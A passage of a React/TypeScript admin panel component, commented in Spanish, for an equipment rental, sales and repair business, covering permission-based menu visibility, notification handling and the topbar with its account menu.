  useRecurso(['clientes'], loadEmpresas, necesita('padron'))
  useRecurso(['clientes'], loadClientesTotal)

  useEffect(() => {
    if (!pendingEquipoId) return
    const e = equipos.find(x => x.id === pendingEquipoId)
    if (!e) return
    setInvEquipo(e)
    setPendingEquipoId(null)
  }, [equipos, pendingEquipoId])

  const catalogosCount = categorias.length + tipos.length + marcas.length
  const rentasActivas = rentas.length
  const usuariosActivos = usuarios.filter(u => u.activo).length
  const esDueno = Boolean(me?.is_superuser)

  /**
   * Capacidades del usuario, según el backend. Sirven para no mostrar secciones
   * que responderían 403: ocultar es cortesía, la autorización real está en la
   * API. Mientras el perfil carga asumimos lo mínimo, para no parpadear
   * mostrando opciones que luego desaparecen.
   */
  const puede = me?.puede
  const puedeVer = (cap: keyof NonNullable<typeof puede>) => Boolean(puede?.[cap])

  // Qué capacidad exige cada sección del menú. Ojo: "vender" y "rentar" son
  // acciones que el técnico sí hace; las secciones de aquí son las LISTAS
  // (historial, montos), que son otra cosa.
  type Cap = keyof NonNullable<typeof puede>
  // Una sección puede pedir UNA capacidad o CUALQUIERA de varias (array). Lo
  // segundo existe por "Mi jornada": el técnico entra a trabajar y
  // administración entra a mirar, con capacidades distintas y la misma puerta.
  const REQUIERE: Partial<Record<Section, Cap | Cap[]>> = {
    // El Resumen son las MÉTRICAS del negocio (ingresos del mes, gráficas): es lo
    // único que sigue pidiendo `ver_dinero`. Las listas de abajo pasaron a
    // `ver_operacion` para que el Gestor pueda trabajarlas —no se puede cancelar
    // una venta sin poder abrirla— sin ver cuánto gana el negocio.
    resumen: 'ver_dinero',
    caja: 'usar_caja',
    ventas: 'ver_operacion',
    cotizaciones: 'cotizar',
    facturacion: 'facturar',
    adeudos: 'ver_operacion',   // cobranza: se trabaja, no es una métrica
    // El mostrador es quien MÁS necesita el padrón, así que va con una
    // capacidad de nivel 1. Empresas (abajo) sigue siendo de administración.
    clientes: 'ver_clientes',
    cupones: 'editar_catalogo',
    catalogos: 'editar_catalogo',
    // El técnico opera todo desde "Mi jornada"; estos módulos de gestión son para
    // administración. Su acceso por API sigue existiendo (lo usa "Mi jornada"), aquí
    // solo se decide qué aparece en el menú. Por eso van con capacidades de
    // administración, no con las del técnico.
    equipos: 'editar_catalogo',
    inventario: 'editar_catalogo',
    refacciones: 'editar_catalogo',
    rentas: 'ver_operacion',
    // La sección Reparaciones es para LLEVAR el taller: historial completo, las
    // cuatro etapas, costos y entrega al cliente. Hacer el trabajo es otra cosa
    // y el técnico ya lo hace desde "Mi jornada", que le trae sus órdenes
    // abiertas sin importar los días que lleven. Abrirle además esta sección era
    // duplicarle el día en otra pantalla. (Antes pedía `ver_dinero`, que era peor:
    // gateaba una pantalla de taller con un permiso de contabilidad.)
    reparaciones: 'gestionar_reparaciones',
    // Pedidos y apartados son VENTAS CON ANTICIPO. No tenía candado, así que la
    // veía cualquiera que entrara al panel —el técnico y el cajero incluidos—,
    // aunque el backend luego les negara los datos.
    pedidos: 'ver_operacion',
    // "Mi jornada": el técnico la trabaja (`jornada_campo`), administración solo
    // la mira (`ver_jornada`). Antes pedía `operar_inventario`, que cascadea
    // hacia arriba desde el nivel 1: por eso el admin la veía completa, con
    // botones de entregar y de subir fotos que no le tocan.
    ubicaciones: ['jornada_campo', 'ver_jornada'],
    equipo: 'gestionar_usuarios',
    permisos: 'configurar_permisos',
  }
  const seccionPermitida = (s: Section) => {
    const cap = REQUIERE[s]
    if (!cap) return true
    return Array.isArray(cap) ? cap.some(puedeVer) : puedeVer(cap)
  }
  // ¿Esta cuenta trabaja el tablero de campo, o solo lo supervisa? Decide los
  // botones de acción dentro del módulo y cómo se llama la sección.
  const jornadaPropia = puedeVer('jornada_campo')
  /** Clave de textos de una sección. Solo "Mi jornada" cambia de nombre según
   *  quién mira: para el técnico es la suya, para administración es la de otro. */
  const claveSec = (s: Section) => (s === 'ubicaciones' && !jornadaPropia ? 'jornada_sup' : s)
  /* Los globitos: la cifra del servidor manda, y la lista cargada es el respaldo
     mientras llega (o si /conteos/ falla). Así el menú no se queda en blanco ni
     obliga a bajar la lista completa de cada sección para poder contarla. */
  const pedidosConSaldo = pedidos.pedidos.filter(p => Number(p.saldo || 0) > 0).length
  const cuenta = {
    equipos: conteos?.equipos ?? equipos.length,
    unidades: conteos?.unidades ?? unidades.length,
    refacciones: conteos?.refacciones ?? refacciones.length,
    catalogos: conteos?.catalogos ?? catalogosCount,
    rentas: conteos?.rentas_activas ?? rentasActivas,
    ventas: conteos?.ventas ?? ventas.length,
    pedidos: conteos?.pedidos ?? pedidosConSaldo,
    cupones: conteos?.cupones ?? coupons.length,
    equipo: conteos?.equipo_activos ?? usuariosActivos,
    adeudos: (conteos?.adeudos ?? adeudos.rentas.length) + (conteos?.pedidos ?? pedidosConSaldo),
  }
  const ordenesAbiertas = conteos?.ordenes_abiertas ?? ordenes.filter(o => o.estado !== 'entregada').length
  const facturasPendientes = conteos?.facturas_pendientes ?? solicitudes.filter(s => s.estado === 'pendiente').length
  const cotizacionesAbiertas = cotAbiertas
  const navGroupsTodos: { title?: string; items: { key: Section; label: string; badge?: number; icon: React.ReactNode }[] }[] = [
    {
      items: [
        { key: 'resumen', label: 'Resumen', icon: <><path d="M4 10.5L12 4l8 6.5V20a1.5 1.5 0 0 1-1.5 1.5H5.5A1.5 1.5 0 0 1 4 20z" /><path d="M9.5 21.5v-6.8a1 1 0 0 1 1-1h3a1 1 0 0 1 1 1v6.8" /></> },
        { key: 'caja', label: 'Caja', icon: <><rect x="2.5" y="7" width="19" height="12" rx="2" /><path d="M2.5 11h19" /><path d="M7 15.5h3" /></> },
      ],
    },
    {
      title: 'navgroup.catalogo',
      items: [
        { key: 'equipos', label: 'Productos', badge: cuenta.equipos, icon: <><path d="M12 3.5l8 4.5-8 4.5-8-4.5z" /><path d="M4 8v9l8 4.5 8-4.5V8" /><path d="M12 12.5v9" /></> },
        { key: 'inventario', label: 'Inventario', badge: cuenta.unidades, icon: <><rect x="4.5" y="4.5" width="6.5" height="6.5" rx="1.2" /><rect x="13" y="4.5" width="6.5" height="6.5" rx="1.2" /><rect x="4.5" y="13" width="6.5" height="6.5" rx="1.2" /><rect x="13" y="13" width="6.5" height="6.5" rx="1.2" /></> },
        { key: 'refacciones', label: 'Refacciones', badge: cuenta.refacciones, icon: <><path d="M14.7 6.3a4 4 0 0 0-5.6 5.6l-6 6v3h3l6-6a4 4 0 0 0 5.6-5.6l-2.5 2.5-2.1-2.1z" /></> },
        { key: 'catalogos', label: 'Clasificación', badge: cuenta.catalogos, icon: <><path d="M7 6.5h12a1.5 1.5 0 0 1 1.5 1.5v12A1.5 1.5 0 0 1 19 21.5H7A1.5 1.5 0 0 1 5.5 20V8A1.5 1.5 0 0 1 7 6.5z" /><path d="M9 11h8M9 15h8M9 19h5" /></> },
      ],
    },
    {
      title: 'navgroup.operacion',
      items: [
        { key: 'ubicaciones', label: 'Mi jornada', icon: <><path d="M12 21s7-5.5 7-11a7 7 0 1 0-14 0c0 5.5 7 11 7 11z" /><circle cx="12" cy="10" r="2.5" /></> },
        { key: 'rentas', label: 'Rentas', badge: cuenta.rentas, icon: <><path d="M7 4.5v2.5M17 4.5v2.5" /><path d="M5.5 8h13" /><path d="M6.5 7.5h11a2 2 0 0 1 2 2v9.5a2 2 0 0 1-2 2h-11a2 2 0 0 1-2-2V9.5a2 2 0 0 1 2-2z" /><path d="M12 13v3l2 1" /></> },
        { key: 'ventas', label: 'Ventas', badge: cuenta.ventas, icon: <><path d="M6.5 9.5h15l-1.6 8.2a2 2 0 0 1-2 1.6H9.2a2 2 0 0 1-2-1.6z" /><path d="M6.5 9.5l-1.2-5h-3" /><path d="M10 21a1 1 0 1 0 0-2 1 1 0 0 0 0 2zM18 21a1 1 0 1 0 0-2 1 1 0 0 0 0 2z" /></> },
        { key: 'pedidos', label: 'Pedidos', badge: cuenta.pedidos, icon: <><path d="M12 3l8 4.5v9L12 21l-8-4.5v-9z" /><path d="M4 7.5l8 4.5 8-4.5" /><path d="M12 12v9" /></> },
        { key: 'reparaciones', label: 'Reparaciones', badge: ordenesAbiertas, icon: <><path d="M14.7 6.3a4 4 0 0 0-5.6 5.6l-6 6v3h3l6-6a4 4 0 0 0 5.6-5.6l-2.5 2.5-2.1-2.1z" /><path d="M14 14l6 6" /></> },
        { key: 'cotizaciones', label: 'Cotizaciones', badge: cotizacionesAbiertas, icon: <><path d="M6 3.5h9l3.5 3.5v13a1 1 0 0 1-1 1H6a1 1 0 0 1-1-1V4.5a1 1 0 0 1 1-1z" /><path d="M14 3.5V8h4.5" /><path d="M8.5 12h7M8.5 15.5h7M8.5 18.5h4" /></> },
        { key: 'facturacion', label: 'Por facturar', badge: facturasPendientes, icon: <><path d="M6 3.5h9l3.5 3.5v13a1 1 0 0 1-1 1H6a1 1 0 0 1-1-1V4.5a1 1 0 0 1 1-1z" /><path d="M14 3.5V8h4.5" /><path d="M8.5 13h7M8.5 16.5h7" /></> },
        { key: 'adeudos', label: 'Adeudos', badge: cuenta.adeudos, icon: <><circle cx="12" cy="12" r="8.5" /><path d="M12 7.5v9M14.8 9.2c-.6-.8-1.6-1.2-2.8-1.2-1.7 0-3 .9-3 2.2 0 2.8 6 1.6 6 4.3 0 1.3-1.3 2.2-3 2.2-1.2 0-2.2-.4-2.8-1.2" /></> },
        { key: 'cupones', label: 'Cupones', badge: cuenta.cupones, icon: <><path d="M7.5 6.5h9a2 2 0 0 1 2 2V10a1.8 1.8 0 0 0 0 4v1.5a2 2 0 0 1-2 2h-9a2 2 0 0 1-2-2V14a1.8 1.8 0 0 0 0-4V8.5a2 2 0 0 1 2-2z" /><path d="M12 8.8v6.4" /></> },
      ],
    },
    {
      title: 'navgroup.clientes',
      items: [
        { key: 'clientes', label: 'Clientes', badge: clientesTotal, icon: <><circle cx="12" cy="8" r="3.5" /><path d="M5 20.5a7 7 0 0 1 14 0" /><path d="M17.5 4.5h4M19.5 2.5v4" /></> },
      ],
    },
    {
      title: 'navgroup.cuenta',
      items: [
        { key: 'equipo', label: 'Equipo', badge: cuenta.equipo, icon: <><circle cx="9" cy="8" r="3.2" /><path d="M3.5 20a5.5 5.5 0 0 1 11 0" /><path d="M16 5.2a3.2 3.2 0 0 1 0 6.2M17.5 20a5.4 5.4 0 0 0-2-4.2" /></> },
        { key: 'permisos', label: 'Permisos', icon: <><rect x="4" y="11" width="16" height="10" rx="2" /><path d="M8 11V7a4 4 0 0 1 8 0v4" /></> },
        { key: 'configuracion', label: 'Configuración', icon: <><path d="M12 15.2a3.2 3.2 0 1 0 0-6.4 3.2 3.2 0 0 0 0 6.4z" /><path d="M19.4 13a1.7 1.7 0 0 0 .3 1.9l.1.1a2 2 0 1 1-2.8 2.8l-.1-.1a1.7 1.7 0 0 0-2.9 1.2v.2a2 2 0 1 1-4 0v-.1A1.7 1.7 0 0 0 7 17.3l-.1.1a2 2 0 1 1-2.8-2.8l.1-.1a1.7 1.7 0 0 0-1.2-2.9H2.8a2 2 0 1 1 0-4h.1A1.7 1.7 0 0 0 4.7 7l-.1-.1a2 2 0 1 1 2.8-2.8l.1.1a1.7 1.7 0 0 0 1.9.3H9.5a1.7 1.7 0 0 0 1-1.6v-.2a2 2 0 1 1 4 0v.1a1.7 1.7 0 0 0 2.9 1.2l.1-.1a2 2 0 1 1 2.8 2.8l-.1.1a1.7 1.7 0 0 0-.3 1.9v.1a1.7 1.7 0 0 0 1.6 1h.2a2 2 0 1 1 0 4h-.1a1.7 1.7 0 0 0-1.6 1z" /></> },
      ],
    },
  ]

  // Se ocultan las secciones sin permiso, y los grupos que quedan vacíos.
  const navGroups = navGroupsTodos
    .map(g => ({ ...g, items: g.items.filter(it => seccionPermitida(it.key)) }))
    .filter(g => g.items.length > 0)

  // Al llegar el perfil puede resultar que la sección abierta no le corresponde
  // (el panel arranca en Resumen, que el almacén no ve). Lo movemos a la primera
  // que sí puede usar en vez de dejarlo mirando un 403.
  useEffect(() => {
    if (!puede || seccionPermitida(section)) return
    // Para quien anda con las máquinas, "Dónde están" es su pantalla; si no le
    // toca, la primera de su menú, y como último recurso su perfil.
    const destino: Section = seccionPermitida('ubicaciones') ? 'ubicaciones'
      : (navGroups[0]?.items[0]?.key ?? 'perfil')
    // `replace`: la sección a la que no tenía acceso no debe quedar en el
    // historial, o el botón "atrás" lo devolvería a la pantalla que se le negó.
    irASeccion(destino, true)
    // Solo reacciona a que lleguen las capacidades o cambie la sección.
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [puede, section])

  const go = (s: Section) => { irASeccion(s); setSidebarOpen(false) }
  // Desde Inventario: al enviar una máquina propia a taller se crea la orden interna
  // y saltamos a Reparaciones abriéndola.
  const abrirReparacion = (ordenId: number) => {
    loadOrdenes(); loadUnidades()
    setOrdenAbrir(ordenId)
    go('reparaciones')
  }

  function openFromNotif(n: Notif) {
    if (!n.leida) api.post(`/notificaciones/${n.id}/leer/`).then(loadNotifs).catch(anotarFallo)
    closeNotifPanel()

    // A dónde puede ir esta cuenta. El técnico no entra a Inventario/Productos
    // (es de administración), así que abrir ahí el detalle de un equipo desde una
    // notificación lo dejaba en botones de Rentar/Vender que no son suyos. Si no
    // puede ver la sección destino, cae en su pantalla: Mi jornada, donde está la
    // tarea (ir a recoger la máquina vencida, por ejemplo).
    const inicioPropio: Section = seccionPermitida('ubicaciones')
      ? 'ubicaciones'
      : (navGroups[0]?.items[0]?.key ?? 'perfil')

    const equipoId = Number(n.data?.equipo_id || 0) || null
    if (equipoId && seccionPermitida('equipos')) {
      go('equipos')
      const e = equipos.find(x => x.id === equipoId)
      if (e) setInvEquipo(e)
      else {
        setPendingEquipoId(equipoId)
        loadEquipos()
      }
      return
    }

    if (n.seccion && seccionPermitida(n.seccion as Section)) {
      go(n.seccion as Section)
      return
    }

    go(inicioPropio)
  }

  function closeNotifPanel() {
    setNotifOpen(false)
    if (notifCloseTimeoutRef.current) window.clearTimeout(notifCloseTimeoutRef.current)
    notifCloseTimeoutRef.current = window.setTimeout(() => setNotifMounted(false), reduceMotion ? 0 : 170)
  }

  function openNotifPanel() {
    if (notifCloseTimeoutRef.current) window.clearTimeout(notifCloseTimeoutRef.current)
    setNotifMounted(true)
    requestAnimationFrame(() => setNotifOpen(true))
  }

  function toggleNotifPanel() {
    if (notifMounted && notifOpen) closeNotifPanel()
    else openNotifPanel()
  }

  /* Quitar UNA notificación de la lista.
     Optimista: desaparece al tocarla y la petición va detrás. Descartar un
     aviso es el gesto más barato que hay —si falla, lo peor que pasa es que
     reaparezca al recargar— y esperar medio segundo a que el servidor conteste
     para que se mueva un renglón se siente roto. */
  function quitarNotif(id: number) {
    setNotifs(prev => prev.filter(x => x.id !== id))
    api.post(`/notificaciones/${id}/eliminar/`, {}, { fondo: true } as never)
      .then(r => { if (typeof r.data?.no_leidas === 'number') setNoLeidas(r.data.no_leidas) })
      .catch(anotarFallo)
  }

  function marcarTodasNotifs() {
    api.post('/notificaciones/leer-todas/').then(loadNotifs).catch(anotarFallo)
  }

  useEffect(() => {
    if (!notifMounted) return

    function onKeyDown(e: KeyboardEvent) {
      if (e.key === 'Escape') closeNotifPanel()
    }

    function onPointerDown(e: MouseEvent | TouchEvent) {
      const t = e.target as Node | null
      if (!t) return
      if (notifBtnRef.current?.contains(t)) return
      if (notifPanelRef.current?.contains(t)) return
      closeNotifPanel()
    }

    document.addEventListener('keydown', onKeyDown)
    document.addEventListener('mousedown', onPointerDown)
    document.addEventListener('touchstart', onPointerDown)
    return () => {
      document.removeEventListener('keydown', onKeyDown)
      document.removeEventListener('mousedown', onPointerDown)
      document.removeEventListener('touchstart', onPointerDown)
    }
  }, [notifMounted, reduceMotion])

  /* Eran 6 porque abajo había un "Ver todas" que llevaba a la sección. Sin esa
     sección, la campana ES el historial: se muestran las 30 más recientes y el
     panelito ya scrollea (el servidor manda hasta 100). */
  const notifsRecientes = [...notifs]
    .sort((a, b) => new Date(b.creada).getTime() - new Date(a.creada).getTime())
    .slice(0, 30)

  return (
    // El acento negro del dueño lo pone `tema-dueno` en <html> (ver index.html y
    // el efecto que carga el perfil). Aquí no se repite: si estuviera en los dos
    // lados, al dejar de ser dueño la clase de arriba se quitaría y esta no.
    <ProveedorPermisos value={puede ?? null}>
    <div className="flex flex-col h-screen bg-app text-ink font-sans overflow-hidden">
      {/* Overlay móvil */}
      {sidebarOpen && (
        <div className="modal-in fixed inset-0 bg-black/40 z-40 lg:hidden" onClick={() => setSidebarOpen(false)} />
      )}

      {/* ─── TOPBAR ─── */}
      <div className="flex-none px-2 pt-2">
        <div className="h-[68px] bg-surface border border-edge rounded-[18px] shadow-[0_1px_3px_rgba(33,29,22,0.04)] flex items-center gap-2 sm:gap-3 px-3 sm:px-5">
          {/* El técnico no ve el hamburguesa en celular: ahí tiene el dock abajo
              con sus tres secciones. Entre 768 y 1024 (tablet, sin dock) sí lo ve.
              Los demás roles, sin cambios (visible hasta lg). */}
          <button onClick={() => setSidebarOpen(true)} className={`${puede?.nivel === 1 ? 'hidden md:flex' : 'flex'} lg:hidden w-9 h-9 rounded-lg items-center justify-center hover:bg-surface-2 text-ink shrink-0`} aria-label="Abrir menú">
            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2"><path strokeLinecap="round" d="M4 6h16M4 12h16M4 18h16" /></svg>
          </button>
          {/* Colapsar/expandir el menú a solo-iconos (desktop), al lado del logo. */}
          <button onClick={toggleColapsado} className="hidden lg:flex w-9 h-9 rounded-lg items-center justify-center text-mute hover:text-ink hover:bg-surface-2 transition-colors shrink-0" aria-label={colapsado ? 'Expandir menú' : 'Colapsar menú'} title={colapsado ? 'Expandir menú' : 'Colapsar menú'}>
            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2" strokeLinecap="round"><path d="M4 6h16M4 12h16M4 18h16" /></svg>
          </button>
          <Link to="/" className="flex items-center gap-2 shrink-0">
            <LogoRemali className="w-8 h-8 text-ink" />
            <span className="font-extrabold tracking-tight text-[15px] hidden sm:block">REMALI</span>
          </Link>
          <div className="flex-1 min-w-0" />
          <div onClick={() => setPaletteOpen(true)} className="hidden md:flex items-center gap-2 border border-edge rounded-[9px] px-3.5 py-2 bg-app w-full max-w-[420px] min-w-0 hover:border-gold/40 transition-colors cursor-pointer">
            <svg className="w-3.5 h-3.5 text-mute shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2"><circle cx="11" cy="11" r="7" /><path d="M21 21l-4-4" strokeLinecap="round" /></svg>
            <input aria-label="Buscar" ref={searchInputRef} readOnly placeholder={t('top.search')} className="flex-1 min-w-0 bg-transparent text-[13.5px] outline-none placeholder-mute cursor-pointer" />
            <span className="text-[11px] font-bold text-mute bg-surface-2 rounded px-1.5 py-0.5 shrink-0">⌘K</span>
          </div>
          <div className="flex-1 min-w-0" />
          <div className="flex items-center gap-1.5 sm:gap-2 shrink-0">
            {/* Notificaciones */}
            <div className="relative">
              <button
                ref={notifBtnRef}
                onClick={toggleNotifPanel}
                className={`relative w-9 h-9 rounded-lg bg-app hover:bg-surface-2 text-mute hover:text-gold-ink active:scale-95 transition-[color,transform,background-color] duration-150 flex items-center justify-center focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-gold/40 ${notifOpen ? 'text-gold-ink' : ''}`}
                aria-label="Notificaciones" aria-haspopup="dialog" aria-expanded={notifOpen}
              >
                <svg className="w-[18px] h-[18px]" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.8"><path strokeLinecap="round" strokeLinejoin="round" d="M15 17h5l-1.4-1.4A2 2 0 0118 14.2V11a6 6 0 10-12 0v3.2c0 .5-.2 1-.6 1.4L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9" /></svg>
                {noLeidas > 0 && (
                  <span className="absolute -top-1 -right-1 min-w-[16px] h-4 px-1 rounded-full bg-red-500 text-white text-[10px] font-bold flex items-center justify-center border-2 border-surface">{noLeidas > 9 ? '9+' : noLeidas}</span>
                )}
                {notifPulse && <span className="absolute inset-0 rounded-full bg-gold/20 animate-ping pointer-events-none" />}
              </button>

              {notifMounted && (
                <>
                {/* Fondo oscuro solo en móvil: el panel se lee como una capa
                    encima, no como un recuadro flotando sobre el contenido. */}
                <div onClick={closeNotifPanel} aria-hidden="true" className={`fixed inset-0 z-[54] bg-black/40 sm:hidden transition-opacity duration-200 motion-reduce:transition-none ${notifOpen ? 'opacity-100' : 'opacity-0 pointer-events-none'}`} />
                <div
                  ref={notifPanelRef} role="dialog" aria-label="Notificaciones"
                  className={`fixed inset-x-3 top-[84px] z-[55] origin-top sm:absolute sm:inset-x-auto sm:right-0 sm:top-full sm:mt-2 sm:w-[380px] sm:max-w-[calc(100vw-2rem)] sm:z-[55] sm:origin-top-right rounded-2xl border border-edge bg-surface shadow-[0_20px_50px_rgba(17,24,39,0.18)] overflow-hidden transform-gpu transition-[transform,opacity] duration-200 ease-[cubic-bezier(0.23,1,0.32,1)] motion-reduce:transition-none ${notifOpen ? 'opacity-100 scale-100' : 'opacity-0 scale-[0.96] pointer-events-none'}`}
                >
                  <div className="px-5 py-4 border-b border-edge flex items-center justify-between gap-3">
                    <div className="text-lg font-extrabold text-ink">Notificaciones</div>
                    <button onClick={marcarTodasNotifs} className="text-[13px] font-bold text-ink hover:text-gold-ink transition-colors">Marcar todas leídas</button>
                  </div>
                  <div className="max-h-[min(55vh,360px)] overflow-y-auto">
                    {notifsRecientes.length === 0 && (
                      <div className="py-12 text-center px-6">
                        <div className="w-12 h-12 rounded-full bg-surface-2 flex items-center justify-center mx-auto mb-3 text-mute">
                          <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.5"><path strokeLinecap="round" strokeLinejoin="round" d="M15 17h5l-1.4-1.4A2 2 0 0118 14.2V11a6 6 0 10-12 0v3.2c0 .5-.2 1-.6 1.4L4 17h5" /></svg>
                        </div>
                        <p className="text-sm text-mute">No tienes notificaciones.</p>
                      </div>
                    )}
                    {/* ── DESCARTAR ──
                        Se va HACIA LA DERECHA, que es de donde vino el gesto: la
                        ✕ está a ese lado y el aviso sale por donde lo empujaste.
                        Es la gramática de deslizar para descartar, y sin ella el
                        renglón simplemente se esfumaba: no había acuse de que
                        TÚ lo hiciste, ni forma de distinguirlo de un aviso que
                        se cayó solo.

                        El hueco lo cierra `layout` con FLIP —transform, no
                        `height`—, así las de abajo suben sin salto. Antes la
                        lista pegaba un brinco de 80px y quien iba leyendo la
                        tercera perdía su sitio.

                        160 ms sin rebote: la casa ya lo tiene escrito —salir
                        dura ~60% de entrar—. Irse rápido se siente responsivo;
                        irse con gracia se siente lento cuando vas a descartar
                        cinco seguidos. */}
                    <AnimatePresence initial={false}>
                    {notifsRecientes.map((n, i) => (
                      <motion.div
                        key={n.id}
                        layout={menosMovimiento ? false : 'position'}
                        initial={menosMovimiento ? { opacity: 0 } : { opacity: 0, y: 6 }}
                        animate={{ opacity: 1, y: 0, transition: { duration: 0.26, ease: [0.23, 1, 0.32, 1], delay: notifOpen ? Math.min(i, 6) * 0.045 : 0 } }}
                        exit={menosMovimiento
                          ? { opacity: 0, transition: { duration: 0.14 } }
                          : { opacity: 0, x: 40, transition: { duration: 0.16, ease: [0.4, 0, 1, 1] } }}
                        transition={{ layout: { duration: 0.22, ease: [0.23, 1, 0.32, 1] } }}
                        className={`flex gap-2.5 px-5 py-4 border-b border-edge/60 last:border-b-0 ${!n.leida ? 'bg-gold-soft/30' : ''}`}
                      >
                        <span className="w-[7px] h-[7px] rounded-full shrink-0 mt-[7px]" style={{ background: !n.leida ? 'var(--c-gold)' : 'var(--c-mute)' }} />
                        <button onClick={() => openFromNotif(n)} className="flex-1 min-w-0 text-left">
                          <div className="font-extrabold text-[14.5px] text-ink">{n.titulo}</div>
                          {n.mensaje && <div className="text-[13.5px] text-mute mt-1 leading-snug line-clamp-2">{n.mensaje}</div>}
                          <div className="text-[12.5px] text-mute mt-1.5">{cuandoLlego(n.creada)}</div>
                        </button>
                        <div className="flex gap-1 shrink-0">
                          {!n.leida && (
                            <button onClick={() => { api.post(`/notificaciones/${n.id}/leer/`).then(loadNotifs).catch(anotarFallo) }} title="Marcar leída" className="w-[26px] h-[26px] rounded-full bg-surface-2 hover:bg-emerald-500/15 text-emerald-600 flex items-center justify-center text-xs font-bold transition-colors">✓</button>
                          )}
                          {/* Una ✕ QUITA. Esta llamaba a `openFromNotif`, o sea
                              abría la notificación y te sacaba del panel a otra
                              sección: el gesto universal de descartar hacía lo
                              contrario de lo que dibuja. El endpoint del
                              personal ya existía; simplemente nadie lo llamaba.
                              La campana del cliente sí lo hacía bien, y de ahí
                              venía el "en las del cliente sí me agarra". */}
                          {/* El acuse del toque: se hunde un pelo al presionar.
                              Sin él, en el instante entre el clic y que la fila
                              empiece a salir no pasa nada y el dedo repite. */}
                          <button onClick={() => quitarNotif(n.id)} title="Quitar de la lista" aria-label={`Quitar "${n.titulo}"`}
                            className="w-[26px] h-[26px] rounded-full bg-surface-2 hover:bg-surface text-mute hover:text-ink flex items-center justify-center text-xs transition-[color,background-color,transform] duration-150 active:scale-90 motion-reduce:active:scale-100 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-gold/40">✕</button>
                        </div>
                      </motion.div>
                    ))}
                    </AnimatePresence>
                  </div>
                </div>
                </>
              )}
            </div>

            {/* Idioma */}
            <div className="relative hidden sm:block">
              <button onClick={() => setLangOpen(o => !o)} className="flex items-center gap-1.5 px-2.5 py-2 rounded-lg border border-edge text-[13px] font-bold hover:bg-surface-2 transition-colors">
                <span>{lang === 'ES' ? '🇲🇽' : '🇺🇸'}</span> {lang} <span className="text-[10px] text-mute">▾</span>
              </button>
              {langOpen && (
                <>
                  <div className="fixed inset-0 z-[55]" onClick={() => setLangOpen(false)} />
                  <div className="absolute right-0 top-full mt-2 w-40 bg-surface border border-edge rounded-xl shadow-[0_20px_50px_rgba(17,24,39,0.18)] z-[56] overflow-hidden py-1">
                    {(['ES', 'EN'] as const).map(l => (
                      <button key={l} onClick={() => cambiarIdioma(l)} className={`w-full flex items-center gap-2 px-3.5 py-2.5 text-[13.5px] font-semibold text-left hover:bg-surface-2 transition-colors ${lang === l ? 'text-gold-ink' : 'text-ink'}`}>
                        {l === 'ES' ? '🇲🇽 Español' : '🇺🇸 English'}{lang === l && <span className="ml-auto text-gold-ink">✓</span>}
                      </button>
                    ))}
                  </div>
                </>
              )}
            </div>

            <ThemeToggle />

            {/* Cuenta */}
            <div className="relative">
              <button onClick={() => setAccountOpen(o => !o)} className="flex items-center gap-2 pl-1.5 pr-2 sm:pr-3 py-1.5 rounded-lg border border-edge hover:bg-surface-2 transition-colors">
                <AvatarUsuario
                  nombre={me?.username} correo={me?.email}
                  avatarUrl={me?.avatar_url} fallbackUrl={me?.avatar_url_rol}
                  tamano="sm" className="w-7 h-7"
                />
                <span className="text-[13.5px] font-bold hidden sm:block">{me?.username || 'Admin'}</span>
                <span className="text-[10px] text-mute hidden sm:block">▾</span>
              </button>
              {accountOpen && (
                <>
                  <div className="fixed inset-0 z-[55]" onClick={() => setAccountOpen(false)} />
                  <div className="absolute right-0 top-full mt-2 w-[250px] bg-surface border border-edge rounded-2xl shadow-[0_20px_50px_rgba(17,24,39,0.18)] z-[56] overflow-hidden">
                    <div className="flex items-center gap-3 p-4">
                      {/* El aro dorado es lo que queda de la marca del dueño:
                          antes el fondo del círculo lo distinguía, y con foto ya
                          no había dónde ponerlo. */}
                      <AvatarUsuario
                        nombre={me?.username} correo={me?.email}
                        avatarUrl={me?.avatar_url} fallbackUrl={me?.avatar_url_rol}
                        className={`w-[42px] h-[42px] ${esDueno ? 'ring-2 ring-gold' : ''}`}
                      />
                      <div className="min-w-0">
                        <div className="text-[15px] font-extrabold text-ink truncate">{me?.username || 'Admin'}</div>
                        <div className="text-[12.5px] text-mute truncate">{me?.email || 'admin@gmail.com'}</div>
                      </div>
                    </div>
                    {/* El rol no va en este menú: el avatar, el nombre y el correo
                        ya dicen de qué cuenta se trata. Si hace falta, está en el
                        perfil. */}
                    <div className="border-t border-edge py-1">
                      <button onClick={() => { setAccountOpen(false); go('perfil') }} className="w-full flex items-center gap-3 px-4 py-3 text-[14px] font-semibold text-ink hover:bg-surface-2 transition-colors">
                        <svg className="w-4 h-4 text-mute" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.6"><circle cx="12" cy="8" r="4" /><path d="M4.5 20a7.5 7.5 0 0 1 15 0" /></svg>Perfil
                      </button>
                      <button onClick={() => { setAccountOpen(false); go('configuracion') }} className="w-full flex items-center gap-3 px-4 py-3 text-[14px] font-semibold text-ink hover:bg-surface-2 transition-colors">
                        <svg className="w-4 h-4 text-mute" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.6"><circle cx="12" cy="12" r="3" /><path d="M19 12a7 7 0 0 0-.1-1.2l2-1.5-2-3.4-2.3 1a7 7 0 0 0-2-1.2L16.2 2h-4l-.4 2.5a7 7 0 0 0-2 1.2l-2.3-1-2 3.4 2 1.5A7 7 0 0 0 5 12a7 7 0 0 0 .1 1.2l-2 1.5 2 3.4 2.3-1a7 7 0 0 0 2 1.2l.4 2.5h4l.4-2.5a7 7 0 0 0 2-1.2l2.3 1 2-3.4-2-1.5A7 7 0 0 0 19 12z" /></svg>Configuración
                      </button>
                    </div>
                    <div className="border-t border-edge">
                      <button onClick={() => { logout(); nav('/login') }} className="w-full flex items-center gap-3 px-4 py-3 text-[14px] font-bold text-red-500 hover:bg-red-500/5 transition-colors">
